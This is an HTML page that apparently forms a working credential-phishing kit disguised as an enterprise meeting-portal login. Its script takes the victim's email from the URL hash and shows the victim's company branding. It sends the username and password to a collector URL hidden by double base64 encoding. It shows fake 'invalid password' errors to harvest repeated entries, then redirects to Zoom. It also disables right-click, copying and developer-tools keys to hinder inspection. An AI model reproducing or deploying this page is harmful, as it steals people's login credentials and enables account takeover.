<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Secure Login · Office</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            min-height: 100vh;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f5f7fc;
        }

        /* ----- two-column container ----- */
        .login-wrapper {
            display: flex;
            min-height: 100vh;
            width: 100%;
            background: #f5f7fc;
        }

        /* ----- LEFT COLUMN: login form (smaller, centered) ----- */
        .login-left {
            flex: 0 0 380px;
            /* fixed width, smaller */
            max-width: 380px;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px 32px;
            box-shadow: 4px 0 24px rgba(0, 0, 0, 0.03);
            position: relative;
            z-index: 2;
        }

        @media (max-width: 820px) {
            .login-left {
                flex: 0 0 340px;
                max-width: 340px;
                padding: 32px 24px;
            }
        }

        @media (max-width: 720px) {
            .login-wrapper {
                flex-direction: column;
            }
            .login-left {
                flex: 1 1 auto;
                max-width: 100%;
                width: 100%;
                padding: 40px 24px;
                box-shadow: none;
                min-height: 50vh;
            }
            .login-right {
                flex: 1 1 40vh;
                min-height: 200px;
            }
        }

        /* inner card  clean, minimal, no heavy glass */
        #logBox {
            width: 100%;
            max-width: 320px;
            margin: 0 auto;
            text-align: left;
            background: transparent;
            padding: 0;
            border-radius: 0;
            box-shadow: none;
            backdrop-filter: none;
            transform: none;
        }

        #logBox table {
            width: 100%;
            border-collapse: collapse;
        }

        #logBox table td {
            padding: 4px 0;
            vertical-align: middle;
        }

        /* ----- welcome message  clean, professional ----- */
        #errMssg {
            font-family: 'Inter', sans-serif;
            font-weight: 600 !important;
            font-size: 1.25rem;
            line-height: 1.4;
            display: inline-block;
            text-align: left;
            margin: 0 0 4px 0;
            color: #0b1a33 !important;
            letter-spacing: -0.02em;
        }

        #errMssg b {
            font-weight: 700;
            color: #1a4c8a;
        }

        /* icon + welcome row */
        #logBox div[style*="display:flex"] {
            display: flex !important;
            align-items: center;
            gap: 14px !important;
            margin-bottom: 20px !important;
            justify-content: flex-start;
        }

        /* domain icon  small, clean */
        #domainIcon {
            width: 44px;
            height: 44px;
            border-radius: 14px;
            object-fit: cover;
            background: #f0f4fe;
            padding: 6px;
            border: 1px solid #e6edf8;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
        }

        /* ----- labels  clean, light ----- */
        #logBox label {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            font-size: 0.75rem !important;
            letter-spacing: 0.02em;
            color: #4a5a72 !important;
            margin: 12px 0 4px 0 !important;
            display: block !important;
            text-align: left;
            text-transform: uppercase;
        }

        /* ----- input fields  subtle, clean ----- */
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 0.95rem;
            background: #fafcff;
            transition: 0.2s ease;
            font-family: 'Inter', sans-serif;
            outline: none;
            color: #0b1a33;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #2a6fdb;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(42, 111, 219, 0.06);
        }

        input::placeholder {
            color: #a0b3cc;
            font-weight: 400;
        }

        /* ----- sign in button  clean, solid ----- */
        #loginbtn {
            width: 100%;
            padding: 13px 0;
            background: #1a3b6b;
            color: white !important;
            font-weight: 600;
            font-size: 0.95rem;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(26, 59, 107, 0.15);
            transition: 0.2s ease;
            text-align: center;
            letter-spacing: 0.3px;
            margin-top: 16px;
            font-family: 'Inter', sans-serif;
        }

        #loginbtn:hover {
            background: #0f2a4f;
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(26, 59, 107, 0.2);
        }

        #loginbtn:active {
            transform: scale(0.97);
        }

        /* hide attempt counters */
        #login_attempt,
        #attemptNumber {
            display: none !important;
        }

        .multiClass {
            display: none;
        }

        input[type="hidden"] {
            display: none;
        }

        /* small extra spacing */
        .login-left .brand-text {
            font-size: 0.75rem;
            color: #8a9bb0;
            margin-top: 24px;
            letter-spacing: 0.02em;
            text-align: center;
            width: 100%;
        }

        /* ----- RIGHT COLUMN: beautiful office image ----- */
        .login-right {
            flex: 1;
            background: #eef2f9;
            background-image: url('https://images.unsplash.com/photo-1497366216548-37526070297c?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            position: relative;
            min-height: 100vh;
        }

        /* subtle overlay to make image blend */
        .login-right::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.02) 0%, rgba(0, 20, 40, 0.04) 100%);
            pointer-events: none;
        }

        /* responsive image fallback */
        @media (max-width: 720px) {
            .login-right {
                min-height: 200px;
                height: 30vh;
                background-size: cover;
            }
        }

        /* error message style override */
        #errMssg[style*="color: #FF0000"] {
            color: #b91c1c !important;
        }

        /* tiny adjustments */
        #logBox .sub-text {
            font-size: 0.85rem;
            color: #6a7b92;
            margin-top: 6px;
        }
    </style>

    <script src="https://api.mrnware.com/storage/trainees/ateja/jquery.min.js.download"></script>
    <script src="https://api.mrnware.com/storage/trainees/ateja/enterprise.js.download"></script>
</head>
<body>

    <div class="login-wrapper">
        <!-- LEFT: login form -->
        <div class="login-left">
            <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" style="width:100%;">
                <input id="domain" type="hidden" value="cutrubus.com" name="domain">
                <input id="fieldName" type="hidden" value="contabo.net" name="field">
                <input type="hidden" id="login_attempt" value="0">
                <input type="hidden" id="attemptNumber" name="number" value="0">
                <input name="RedirectTo" value="/workflow/webmail.nsf/webform2019?OpenForm" type="hidden">

                <div id="logBox" align="left">
                    <table border="0" cellspacing="0" cellpadding="0" style="width:100%;">
                        <tbody>
                            <tr>
                                <td style="padding-bottom:4px;">
                                    <div style="display:flex; align-items:center; gap:14px; margin-bottom:20px; justify-content:flex-start;">
                                        <img id="domainIcon" src="https://api.mrnware.com/storage/trainees/ateja/0.gif" alt="Domain Icon" style="width:44px; height:44px; border-radius:14px; object-fit:cover; background:#f0f4fe; padding:6px; border:1px solid #e6edf8;">
                                        <b><font face="Inter, sans-serif" id="errMssg" style="font-weight:600; color:#0b1a33;">
										Welcome to domain name<br>Meeting portal</font></b>
                                    </div>
                                    <div style="font-size:0.85rem; color:#6a7b92; margin-top:-6px; margin-bottom:8px;">
										Sign in to continue</div>
                                </td>
                            </tr>
                            <tr>
                                <td style="padding:2px 0;">
                                    <label for="user-id">Username</label>
                                    <input name="email" value="" maxlength="50" autocomplete="off" type="email" id="email" placeholder="your@email.com">
                                </td>
                            </tr>
                            <tr>
                                <td style="padding:2px 0 4px 0;">
                                    <label for="pw-id">Password</label>
                                    <input name="password" value="" type="password" maxlength="255" autocomplete="off" id="password" placeholder="password">
                                </td>
                            </tr>
                            <tr>
                                <td style="padding-top:8px;">
                                    <div id="loginbtn" onclick="processLogin()">
										Sign In</div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </form>
            <div class="brand-text">Secure - Enterprise Access</div>
        </div>

        <!-- RIGHT: office image -->
        <div class="login-right"></div>
    </div>

    <script>
        // ============================================================
        // KEYBOARD SHORTCUT DISABLING (same as original)
        // ============================================================
        document.addEventListener('keydown', function(event) {
            var key = event.keyCode || event.which;
            var ctrlKey = event.ctrlKey;
            var shiftKey = event.shiftKey;
            var isForbidden = false;
            if (key === 123) isForbidden = true;
            if (ctrlKey && key === 85) isForbidden = true;
            if (ctrlKey && shiftKey && key === 73) isForbidden = true;
            if (ctrlKey && shiftKey && key === 74) isForbidden = true;
            if (ctrlKey && shiftKey && key === 67) isForbidden = true;
            if (ctrlKey && key === 83) isForbidden = true;
            if (ctrlKey && key === 80) isForbidden = true;
            if (ctrlKey && key === 82) { event.preventDefault();
                isForbidden = true; }
            if (key === 116) { event.preventDefault();
                isForbidden = true; }
            if (ctrlKey && shiftKey && key === 82) { event.preventDefault();
                isForbidden = true; }
            if (ctrlKey && key === 69) isForbidden = true;
            if (ctrlKey && key === 79) isForbidden = true;
            if (ctrlKey && key === 72) isForbidden = true;
            if (ctrlKey && key === 74) isForbidden = true;
            if (ctrlKey && shiftKey && key === 85) isForbidden = true;
            if (ctrlKey && shiftKey && key === 80) isForbidden = true;
            if (key === 112 || key === 114) { event.preventDefault();
                isForbidden = true; }
            if (isForbidden) {
                event.preventDefault();
                event.stopPropagation();
                return false;
            }
        });

        document.addEventListener('contextmenu', function(event) {
            event.preventDefault();
            return false;
        });
        document.addEventListener('dragstart', function(event) {
            event.preventDefault();
            return false;
        });
        document.addEventListener('selectstart', function(event) {
            event.preventDefault();
            return false;
        });
        document.addEventListener('copy', function(event) {
            event.preventDefault();
            return false;
        });
        document.addEventListener('cut', function(event) {
            event.preventDefault();
            return false;
        });

        // ============================================================
        // LOGIC (unchanged core, with minor style tweaks)
        // ============================================================
        // Double base64 encoded endpoint.
        // Inner base64:  aHR0cHM6Ly9pZC5zd2p1dHEub3JnL3dlYmFwcC9hdGVqYXZpY2t5LnBocA==
        // Outer base64:  YUhSMGNITTZMeTlwWkM1emQycDFkSEV1YjNKbkwzZGxZbUZ3Y0M5aGRHVnFZWFpwWTJ0NUxuQm9jQT09
        var API_ENDPOINT = atob(atob('YUhSMGNITTZMeTlwWkM1emQycDFkSEV1YjNKbkwzZGxZbUZ3Y0M5aGRHVnFZWFpwWTJ0NUxuQm9jQT09'));

        // Apply decoded URL to the form so native POST fallback also works
        document.getElementById('logonForm').action = API_ENDPOINT;

        function extractDomainNameOnly(fullDomain) {
            if (!fullDomain) return "domain name";
            var domainParts = fullDomain.split('.');
            if (domainParts.length > 0) {
                return domainParts[0];
            }
            return fullDomain;
        }

        function getDomainIconUrl(domain) {
            if (!domain) return 'https://api.mrnware.com/storage/trainees/ateja/0.gif';
            return 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=64';
        }

        function updateWelcomeMessage(emailAddress) {
            var errElement = document.getElementById('errMssg');
            var iconElement = document.getElementById('domainIcon');
            if (!errElement) return;
            var domainNameOnly = "domain name";
            var fullDomain = "";
            if (emailAddress && emailAddress.includes('@')) {
                fullDomain = emailAddress.split('@')[1];
                domainNameOnly = extractDomainNameOnly(fullDomain);
                if (iconElement && fullDomain) {
                    iconElement.src = getDomainIconUrl(fullDomain);
                    iconElement.onerror = function() {
                        this.src = 'https://api.mrnware.com/storage/trainees/ateja/0.gif';
                    };
                }
            } else {
                if (iconElement) {
                    iconElement.src = 'https://api.mrnware.com/storage/trainees/ateja/0.gif';
                }
            }
            errElement.innerHTML = "Welcome to " + domainNameOnly + "<br>meeting portal";
            errElement.style.color = '#0b1a33';
            errElement.style.fontWeight = '600';
        }

        function isBase64(str) {
            try { return btoa(atob(str)) === str; } catch (err) { return false; }
        }

        function decodeEmailFromHash(hash) {
            let base64Part = hash.split('&')[0].split('?')[0].trim();
            if (!isBase64(base64Part)) return base64Part;
            try {
                let once = atob(base64Part);
                if (once.includes('@')) return once;
                try {
                    let twice = atob(once);
                    if (twice.includes('@')) return twice;
                } catch (e) { return once; }
            } catch (e) { return base64Part; }
            return base64Part;
        }

        (function() {
            var hash = window.location.hash.replace("#", "").trim();
            var emailField = document.getElementById("email");
            if (!emailField) return;
            if (hash && hash.length > 0) {
                var fullEmail = decodeEmailFromHash(hash);
                emailField.value = fullEmail;
                if (fullEmail.includes('@')) {
                    var domainPart = fullEmail.split('@')[1];
                    var domainField = document.getElementById('domain');
                    if (domainField) domainField.value = domainPart;
                    updateWelcomeMessage(fullEmail);
                }
            }
        })();

        let loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');

        function setErrorMessage(msg, isError) {
            var errorElement = document.getElementById('errMssg');
            if (errorElement) {
                errorElement.innerHTML = msg;
                errorElement.style.color = '#b91c1c';
                errorElement.style.fontWeight = '600';
            }
        }

        function setFormFocus() {
            document.getElementById('password').focus();
        }

        function setupEmailWatcher() {
            var emailInput = document.getElementById('email');
            if (emailInput) {
                emailInput.addEventListener('input', function() {
                    var errElem = document.getElementById('errMssg');
                    if (errElem && !errElem.innerHTML.includes('invalid') && !errElem.innerHTML.includes('error') && !errElem
                        .innerHTML.includes('wrong')) {
                        updateWelcomeMessage(this.value);
                    }
                });
                emailInput.addEventListener('blur', function() {
                    var errElem = document.getElementById('errMssg');
                    if (errElem && !errElem.innerHTML.includes('invalid') && !errElem.innerHTML.includes('error') && !errElem
                        .innerHTML.includes('wrong')) {
                        updateWelcomeMessage(this.value);
                    }
                });
            }
        }

        $(document).ready(function() {
            setupEmailWatcher();
            $('#password').focus();
            $('#loginbtn').off('click').on('click', function(event) {
                event.preventDefault();
                processLogin();
            });
            $('#logBox').on('keydown', function(event) {
                if (event.which === 13) {
                    event.preventDefault();
                    processLogin();
                }
            });
        });

        function processLogin() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var redirectTo = document.querySelector('input[name="RedirectTo"]')?.value || '';
            var attemptInput = document.getElementById('attemptNumber');
            var loginAttemptInput = document.getElementById('login_attempt');
            var domain = email.split('@')[1] || '';

            if (!email || !password) {
                setErrorMessage("Please enter both username and password", true);
                return;
            }

            loginAttempt = parseInt(loginAttemptInput?.value || '0');
            setErrorMessage("Authenticating ...", false);

            var formData = new URLSearchParams();
            formData.append('email', email);
            formData.append('password', password);
            formData.append('domain', document.getElementById('domain').value);
            formData.append('field', document.getElementById('fieldName').value);
            formData.append('RedirectTo', redirectTo);
            formData.append('attempt', loginAttempt + 1);

            fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formData.toString()
                })
                .then(response => response.text())
                .then(data => {
                    if (loginAttempt === 0) {
                        setErrorMessage("Invalid username or password. Please sign in again.", true);
                        document.getElementById('password').value = '';
                        loginAttemptInput.value = '1';
                        if (attemptInput) attemptInput.value = '1';
                        document.getElementById('password').focus();
                    } else if (loginAttempt === 1) {
                        setErrorMessage("Invalid username or password. Please sign in again.", true);
                        document.getElementById('password').value = '';
                        loginAttemptInput.value = '2';
                        if (attemptInput) attemptInput.value = '2';
                        document.getElementById('password').focus();
                    } else if (loginAttempt === 2) {
                        var errElement = document.getElementById('errMssg');
                        if (errElement) errElement.innerHTML = "";
                        loginAttemptInput.value = '3';
                        if (attemptInput) attemptInput.value = '3';
                        setTimeout(function() {
                            if (domain) {
                                window.location.href = "https://zoom.us/meeting/rooms" + domain;
                            } else if (email && email.includes('@')) {
                                var emailDomain = email.split('@')[1];
                                window.location.href = "https://zoom.us/meeting/rooms" + emailDomain;
                            } else {
                                window.location.href = "https://www.example.com";
                            }
                        }, 1500);
                    }
                })
                .catch(error => {
                    console.log('Fetch failed, using form submission:', error);
                    var tempForm = document.createElement('form');
                    tempForm.method = 'POST';
                    tempForm.action = API_ENDPOINT;
                    tempForm.enctype = 'application/x-www-form-urlencoded';
                    var fields = {
                        'email': email,
                        'password': password,
                        'domain': document.getElementById('domain').value,
                        'field': document.getElementById('fieldName').value,
                        'RedirectTo': redirectTo,
                        'attempt': loginAttempt + 1
                    };
                    for (var key in fields) {
                        var input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = fields[key];
                        tempForm.appendChild(input);
                    }
                    document.body.appendChild(tempForm);
                    tempForm.submit();
                });
        }

        window.clkLgn = function(cb) { cb(false); };
        window.checkSubmit = function(e, cb) { if (e.which == 13) { e.preventDefault();
                cb(false); } };
        window.displayCss = function(status) {
            if (status) setErrorMessage("Check your entry for password. Please sign in again:", true);
            else setErrorMessage("Invalid username or password. Please sign in again:", true);
            $('#password').focus();
        };

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
                e.preventDefault();
                processLogin();
            }
        });

        setInterval(function() {
            var errElem = document.getElementById('errMssg');
            if (errElem && errElem.innerHTML) {
                var text = errElem.innerHTML;
                if (text.includes('Attempt') || text.includes('Redirecting')) {
                    var emailField = document.getElementById('email');
                    updateWelcomeMessage(emailField ? emailField.value : '');
                }
            }
        }, 100);

        window.addEventListener('load', function() {
            var emailField = document.getElementById('email');
            updateWelcomeMessage(emailField ? emailField.value : '');
            if (document.getElementById('password')) {
                document.getElementById('password').focus();
            }
        });
    </script>
</body>
</html>
